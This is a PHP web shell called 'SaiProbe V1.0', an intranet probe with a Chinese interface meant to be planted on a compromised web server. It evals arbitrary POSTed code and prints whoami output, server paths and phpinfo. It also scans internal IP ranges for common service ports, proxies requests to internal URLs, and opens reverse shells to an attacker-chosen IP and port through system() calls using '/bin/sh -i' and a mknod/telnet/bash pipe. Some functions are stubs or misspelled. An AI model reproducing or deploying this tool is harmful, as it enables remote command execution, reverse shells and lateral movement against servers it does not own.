<?/*
    1.服务器基本信息收集
    2.反弹转发
    3.php函数执行
    4.批量端口扫描
    5.服务器存活探测（默认探测80端口，配合Brupsuite）
    6.代理访问
    7.phpinfo信息
*/
    error_reporting(0); //抑制所有错误信息
    set_time_limit(0);
    ob_end_clean();     //关闭缓冲区//===================================================端口扫描类=====================================================
    class portScan{
        public $port;
        function __construct(){
            $this->port=array('20','21','22','23','69','80','81','110','139','389','443','445','873','1090','1433','1521','2000','2181','3306','3389','5632','5672','6379','7001','8000','8069','8080','8081','9200','10050','10086','11211','27017','28017','50070');
        }
        //url格式处理函数
        function urlFilter($url){
            $pattern="/^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])(\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])){3}$/";
            $match=preg_match($pattern,$url);
            if(!$match){
                echo "<script>alert('你输入的ip地址非法，请重新输入')</script>";
                exit("再检查检查吧……");
            }
            $url=str_replace("http://", "",$url);
            $url=str_replace("/", "",$url);
            return $url;
        }
        function Prepare(){
            if($_POST['end']!=""){         
                $base_url_1=self::urlFilter($_POST['start']);                  
                $base_url_2=self::urlFilter($_POST['end']);
                /*$base_url_1=$_POST['start'];                 
                $base_url_2=$_POST['end'];*/
                $base_url=array($base_url_1,$base_url_2);
                 
                self::Scan($base_url,$this->port);
            }else{
                echo "<script>alert('后面那个框也要输的……')</script>";
            }
        }
        function outPut(){
 
        }
        function Scan($base_url,$port){
            $start=explode('.',$base_url['0']);
            $end=explode('.',$base_url['1']);
            $length=$end['3']-$start['3'];
            for($i=0;$i<=$length;$i++){
                $ip=$start[0].".".$start[1].".".$start[2].".".($start[3]+$i);
                foreach ($port as $ports) {
                    $ips="$ip:$ports"; 
                    //stream_set_blocking($ips, 0);               
                    //$result=stream_socket_client($ips,$errno, $errstr,0.1,STREAM_CLIENT_CONNECT);
                    $result=@fsockopen($ip,$ports,$errno,$errstr,0.1);
                    if($result){
                        echo $ip."---------------------".$ports."端口开放"."<br>";
                        flush();
                    }
                }
            }
        }
    }//===================================存活探测函数==============================
    function ssrf($ip,$port=80){
        $res=fsockopen($ip,$port,$errno,$errstr,0.2);
        if($res){
            echo "该地址存活的！！！！！！";
        }else{
            echo "不存活！";
        }
 
    }//============================端口转发函数=====================================
    function tansmit($sourceip,$sourceport,$targetip,$targetport){
        if(strtsr(php_uname(),'Windows')){
 
        }elseif (strstr(php_uname(), 'Linux')) {
             
        }else{
 
        }
    }//============================Shell反弹函数====================================
    function bounce($targetip,$targetport){
        if(substr(php_uname(), 0,1)=="W"){
            system("php -r '$sock=fsockopen($targetip,$targetport);exec('/bin/sh -i <&3 >&3 2>&3');'");
        }elseif (substr(php_uname(), 0,1)=="L") {
            echo 'linux test';
            system('mknod inittab p && telnet {$targetip} {$targetport} 0<inittab | /bin/bash 1>inittab');
        }else{
            echo "<script>alert('Can't recognize this operation system!)</script>";
        }
    }//==============================在线代理函数====================================
    function proxy($url){
        $output=file_get_contents($url);
        return $output;
    }//======================================Main===================================
    $scan=new portScan();
    if(isset($_POST['submit'])){
        if($_POST['start']!=""){
            $scan->Prepare();
        }else{
            echo "<script>alert('什么都没输怎么扫？')</script>";
        }      
    }
 
    if(isset($_GET['ip'])){
        $ssrf_ip=$_GET['ip'];
        if($ssrf_ip!=0){
            ssrf($ssrf_ip);
        }
    }
 
    if(isset($_POST['trans'])) {
        tranmit($_POST['sourceip'],$_POST['sourceport'],$_POST['targetip'],$_POST['targetport']);
    }
 
    if(isset($_POST['rebound'])){
        bounce($_POST['tarip'],$_POST['tarport']);
    }
    if (isset($_GET['proxy'])) {
        $proxy_web=proxy($_GET['proxy']);
        echo "<div>".$proxy_web."</div>";
    }?><!--=======================================================================================================================================================================华丽的分割线=================================================================================================================================================================--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head>   <title>Sai 内网探针V1.0</title>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><style type="text/css"></style></head>
<div align="center">
    <h1>SaiProbe V1.0</h1><hr>
    <div>
        <a href="?id=1">基本信息</a>|<a href="?id=2">反弹转发</a>|<a href="?id=3">命令执行</a>|<a href="?id=4">端口扫描</a>|<a href="?id=5&ip=0">存活探测</a>|<a href="?id=6">phpinfo</a>|<a href="?id=7&proxy=">代理访问</a>|<a href="#">更多功能</a>
    </div>
<hr>
<!-----------------------------基本信息-------------------------------->
</div><div align="center" id="normal">
    <fieldset>
        <legend>基本信息</legend>
    <table border="1" align="center" width="50%">
        <tr>
            <td>服务器IP/地址</td>
            <td><?php echo $_SERVER['SERVER_NAME'];?>(<?php if('/'==DIRECTORY_SEPARATOR){echo $_SERVER['SERVER_ADDR'];}else{echo @gethostbyname($_SERVER['SERVER_NAME']);} ?>)</td>
        </tr>
        <tr>
            <td>当前用户</td>
            <td><?php echo `whoami`?></td>
        </tr>
        <tr>
            <td>网站目录</td>
            <td><?php echo $_SERVER['DOCUMENT_ROOT']?str_replace('\\','/',$_SERVER['DOCUMENT_ROOT']):str_replace('\\','/',dirname(__FILE__));?></td>
        </tr>
        <tr>
            <td>探针所在目录</td>
            <td><?php echo str_replace('\\','/',__FILE__)?str_replace('\\','/',__FILE__):$_SERVER['SCRIPT_FILENAME'];?></td>
        </tr>
        <tr>
            <td>服务器端口</td>
            <td><?php echo $_SERVER['SERVER_PORT'];?></td>
        </tr>
        <tr>
            <td>服务器标识</td>
            <td><?php if($sysInfo['win_n'] != ''){echo $sysInfo['win_n'];}else{echo @php_uname();};?></td>
        </tr>
        <tr>
            <td>PHP版本</td>
            <td><?php echo PHP_VERSION;?></td>
        </tr>
        <tr>
            <td>PHP安装路径</td>
            <td><?php echo $_SERVER["PHPRC"];?></td>
        </tr>
    </table> 
    </fieldset>
</div><!-----------------------------命令执行--------------------------------><div align="center" style="display:none" id="command">
    <fieldset>
        <legend>执行函数</legend>
            <form method="post" action="#">
                <div>
                    命令：<input type="text" placeholder="system(‘whoami’)" name="order"/>
                    <input type="submit" value="执行">
                </div>
            </form>
            <div>
                    <textarea cols="150" rows="30" style="resize:none">
                        <? $order=$_POST['order'];echo eval($order.";");?>
                    </textarea>
            </div>
    </fieldset>  
</div><!-----------------------------反弹转发--------------------------------><div align="center" style="display:none" id="inner">
    <fieldset>
        <legend>反弹转发</legend>
            <div>
                <form method="post" action="#">
                Bash反弹：<input type="text" name="tarip" placeholder="目标IP">
                    <input type="text" name="tarport" placeholder="目标端口"> 
                    <input type="submit" name="rebound" value="执行">
                </form>
                <form method="post" action="">
                端口转发：<input type="text" name="sourceip" placeholder="本地IP"><input type="text" name="sourceport" placeholder="本地端口">
                        <input type="text" name="targetip" placeholder="目标IP"><input type="text" name="targetport" placeholder="目标端口">
                        <input type="submit" name="trans" value="执行">
                <form>
            </div>
    </fieldset>
</div><!-----------------------------批量端口扫描--------------------------------><div align="center" id="portscan" style="display:none">
    <fieldset>
        <legend>批量端口扫描</legend>
        <form action="#" method="post">
            <input type="text" name="start"> -
            <input type="text" name="end">
            <input type="submit" name="submit" value="开始扫描">
        </form>
    </fieldset></div>
 
<!-----------------------------存活探测-------------------------------->
<div align="center" id="ssrf" style="display:none">
    <fieldset>
        <legend>存活探测</legend>
            <b>请在url的IP参数后跟上ip地址,配合Brupsuit爆破功能进行存活探测,默认为80端口</b>
    </fieldset>
</div><!-----------------------------phpinfo--------------------------------><div align="center" id="phpinfo" style="display:none">
    <fieldset>
        <legend>phpinfo</legend>
        <?php phpinfo()?>
    </fieldset></div>
 
<!-----------------------------代理访问-------------------------------->
<div align="center" id="proxy" style="display:none">
    <fieldset>
        <legend>代理访问</legend>
            <b>请在url的proxy参数跟上内网地址</b>
    </fieldset>
</div><!-----------------------------更多功能--------------------------------><div align="center" id="phpinfo" style="display:none">
    <fieldset>
    </fieldset>
</div><div align="center"><a href="http://www.heysec.org">Code by Sai</a></div><script type="text/javascript">
        var id=<?php echo $_GET['id'];?>;
        var x;
        switch (id){
            case 1:
            break;
            case 2:
                document.getElementById("inner").style.display='';
            break;
            case 3:
                document.getElementById("command").style.display='';
            break;
            case 4:
                document.getElementById("portscan").style.display='';
            break;
            case 5:
                document.getElementById("ssrf").style.display='';
            break;         
            case 6:
                document.getElementById("phpinfo").style.display='';
            break;
            case 7:
                document.getElementById("proxy").style.display='';
            break;
        }
    </script>
